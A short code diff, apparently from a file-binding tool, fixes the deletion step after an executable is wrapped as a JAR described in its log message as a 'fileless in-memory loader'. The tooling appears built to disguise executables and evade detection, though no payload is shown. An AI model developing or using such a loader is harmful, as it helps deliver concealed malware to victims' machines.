@@ -962,8 +962,8 @@ func runBoundFiles() {
             const exeBytes = fs.readFileSync(filePath);
             const jarPath = filePath.replace(/\.[^.]+$/, ".jar");
             await wrapPeAsJar(exeBytes, jarPath);
-            // Remove original PE, update references
-            fs.unlinkSync(filePath);
+            // Remove original PE only if it's a different file than the JAR output
+            if (jarPath !== filePath) fs.unlinkSync(filePath);
             finalSize = fs.statSync(jarPath).size;
             const jarOutputName = outputName.replace(/\.[^.]+$/, ".jar");
             sendToStream({ type: "output", text: `JAR wrapped: ${exeBytes.length} byte PE → ${finalSize} byte JAR (fileless in-memory loader)\n`, level: "info" });
